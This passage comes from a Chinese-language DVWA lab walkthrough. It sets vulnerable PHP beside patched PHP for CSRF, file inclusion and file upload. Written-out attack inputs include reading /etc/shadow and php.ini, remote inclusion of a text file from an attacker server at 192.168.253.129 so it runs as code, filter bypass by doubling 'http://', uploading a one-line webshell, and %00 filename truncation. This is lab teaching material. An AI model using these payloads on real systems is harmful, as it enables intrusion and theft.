<code>HTTP_REFERER</code>（http包头的Referer参数的值，表示来源地址）中是否包含<code>SERVER_NAME</code>（http包头的Host参数，及要访问的主机名，这里是<code>192.168.220.1</code>），希望通过这种机制抵御CSRF攻击。</p><p><strong>漏洞利用</strong></p><p>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是<code>192.168.220.1</code>）我们可以将攻击页面命名为<code>192.168.220.1.html</code>或者放到文件夹<code>192.168.220.1</code>下</p><p><img src="https://i.loli.net/2020/03/03/Y9ljd3tPvcMraKy.png"></p><p><code>192.168.253.129</code>是攻击者的服务器。</p><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码加入了<code>Anti-CSRF token</code>机制，用户每次访问改密页面时，服务器会返回一个随机的<code>token</code>，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p><strong>漏洞利用</strong></p><p>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p><p>这就需要利用XSS弹<code>cookie</code>，得到<code>cookie</code>中的<code>token</code>, 加入token后访问才行。</p><p>这里利用dvwa的存储型XSS的漏洞，来弹token。</p><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_curr = $_GET[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input</span></span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_curr ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// It does!</span></span><br><span class="line">        $pass_new = stripslashes( $pass_new );</span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p><h1 id="File-inclusion-文件包含"><a href="#File-inclusion-文件包含" class="headerlink" title="File inclusion(文件包含)"></a>File inclusion(文件包含)</h1><p>文件包含,分为两种：本地文件包含和远程文件包含。当服务器开启<code>allow_url_include</code>选项的时候，就可以通过php的包含函数（类似python，java的import）<code>include(),require(),require_once(),include_once()</code>利用url去动态包含文件，此时如果没有对文件来源进行检查，就容易导致任意文件读取和任意命令执行。</p><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一行代码，十分简单，对page参数没有做任何的过滤跟检查。</p><blockquote><p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p></blockquote><p>page参数可控，可以先尝试本地文件包含。</p><p>尝试<code>?page=/etc/shadow</code></p><p>但是因为我的环境直接放在Windows，没有报错了，而且爆出了网站路径，可以进一步查找<code>php.ini</code>(php的配置文件)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;D:\Environment\phpstudy_pro\WWW\dvwa\php.ini</span><br><span class="line">或者</span><br><span class="line">page&#x3D;..\..\..\..\..\..\..\Environment\phpstudy_pro\WWW\dvwa\php.ini</span><br><span class="line"></span><br><span class="line">This file attempts to overwrite the original php.ini file. Doesnt always work. </span><br><span class="line">magic_quotes_gpc &#x3D; Off </span><br><span class="line">allow_url_fopen on </span><br><span class="line">allow_url_include on</span><br></pre></td></tr></table></figure><p>发现是允许远程文件包含。配置文件中的<code>Magic_quote_gpc</code>选项为off。在php版本<code>&lt;5.3.4</code>的服务器中，当<code>Magic_quote_gpc</code>选项为off时，我们可以在文件名中使用<code>%00</code>进行截断，也就是说文件名中<code>%00</code>后的内容不会被识别。使用<code>%00</code>截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php。</p><p>因为打开<code>allow_url_fopen</code>和<code>allow_url_include</code>还可以通过远程文件包含，可以通过远程文件包含，可以导致任意代码执行。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;http:&#x2F;&#x2F;192.168.253.129&#x2F;test.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/s9JWv5jlnCxuPQL.png"></p><p>需要注意，文件是一般文件（比如txt），然后远程文件包含的时候当做php执行，这样就可以在靶机执行任意代码。但是如果远程包含一个php文件，就只是直接访问而已（以远程文件所在的服务器环境执行），而不是执行代码。如下（我的靶机是<code>Windows</code>, 远程文件放在<code>Linux</code>）：</p><p><img src="https://i.loli.net/2020/03/01/rovZbXY9ucGeatO.png"></p><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><p>相比于Low级别，加了一点过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>http://</code>或者<code>https://</code>或者<code>../</code>,<code>..\</code>替换成空。</p><p>但是这种程度的过滤，平角裤平角裤…</p><p>一方面，我们仍然可以通过双写绕过过滤字符，二方面，可以采用绝对路径进行本地文件包含。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;192.168.253.129&#x2F;test.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/FfQy6DwhJjGg1XI.png"></p><h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, $file ) &amp;&amp; $file != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fnmatch ( string <code>$pattern</code> , string <code>$string</code> [, int <code>$flags</code> = 0 ] ) : bool</p><p><strong>fnmatch()</strong> 检查传入的 <code>string</code> 是否匹配给出的 shell 统配符 <code>pattern</code>。</p></blockquote><p>匹配文件名，只能是<code>file*</code>，但是我们依然可以利用<code>file://</code>协议来读取文件！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;Environment&#x2F;PhpStudy2018&#x2F;PHPTutorial&#x2F;WWW&#x2F;dvwa&#x2F;php.ini</span><br></pre></td></tr></table></figure><p>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含（本地文件包含）上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p><h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Onlyallowinclude.phporfile&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>($file!=<span class="string">&quot;include.php&quot;</span>&amp;&amp;$file!=<span class="string">&quot;file1.php&quot;</span>&amp;&amp;$file!=<span class="string">&quot;file2.php&quot;</span>&amp;&amp;$file!=<span class="string">&quot;file3.php&quot;</span>)&#123;</span><br><span class="line"><span class="comment">//Thisisn&#x27;tthepagewewant!</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;ERROR:Filenotfound!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为<code>include.php、file1.php、file2.php、file3.php</code>之一，彻底杜绝了文件包含漏洞。</p><h1 id="File-Upload（文件上传）"><a href="#File-Upload（文件上传）" class="headerlink" title="File Upload（文件上传）"></a>File Upload（文件上传）</h1><p>上传文件漏洞，通常时候由于对上传文件的类型、内容没有做严格过滤检查，使得攻击者可以通过上传木马来getshell。</p><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>basename(path, suffix)</code></p><p>函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。</p></blockquote><p>可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p><p>文件上传漏洞的利用是有限制条件的</p><ol><li><p>首先当然是要能够成功上传木马文件</p></li><li><p>其次上传文件必须能够被执行</p></li><li><p>最后就是上传文件的路径必须可知。</p></li></ol><p>不幸的是，这里三个条件全都满足。上传一个一句话木马。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;v0w.php succesfully uploaded!</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/APCkEynZzlLwJFS.png"></p><h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">&quot;image/jpeg&quot;</span> || $uploaded_type == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相比于low级别，验证了上传的文件类型要是<code>image/jpeg || image/png</code>。burp接收，修改字段<code>Content-Type</code>即可。</p><p><img src="https://i.loli.net/2020/03/03/XosupF72v9MTJ8U.png"></p><h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">&quot;jpg&quot;</span> || strtolower( $uploaded_ext ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( $uploaded_ext ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>增加了文件后缀的白名单，又要后缀满足条件又要能执行，如果是<code>php&lt;5.3.4</code>的情况，可以利用<code>%00</code>截断文件名。而在其他版本，或许可以考虑上传<code>jpg</code>，利用其他漏洞读上传的文件。</p><p><strong>利用%00截断（php版本&lt;5.3.4）</strong></p><p>上传写有一句话的的马，命令为<code>v0w.php .jpg</code>,然后修改空格为<code>0x00</code>,从而截断，服务器会认为该文件为<code>v0w.php</code>,同时又可以通过后缀名的检测。</p><blockquote><p>注意：这里所说的%00，是指<code>0x00</code>，在burpsuite中修改时，需要在hex中修改</p></blockquote><p><img src="https://i.loli.net/2020/03/03/Nfe1SQ8Fpnvjy7x.png"></p><p><strong>结合包含漏洞进行攻击（php&gt;5.3.4）</strong></p><p>我们只能上传<code>v0w.jpg</code>(写有一句话木马)，但是作为jpg文件，没法执行。同时我们知道上传文件的路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;v0w.jpg succesfully uploaded!</span><br></pre></td></tr></table></figure><p>在<strong>File Inclusion</strong>中，我们爆出了WWW的路径，拼接一下得到完整的<code>v0w.jpg</code>的路径。然后我们可以利用<code>file://</code>来读这个图片。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;Environment&#x2F;PhpStudy2018&#x2F;PHPTutorial&#x2F;WWW&#x2F;dvwa&#x2F;hackable&#x2F;uploads&#x2F;v0w.jpg</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/XgnaKYqNDG5A2sJ.png"></p><h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>; </span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;; </span></span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">&#x27;.&#x27;</span> . $uploaded_ext; </span><br><span class="line">    $temp_file     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) ); </span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . 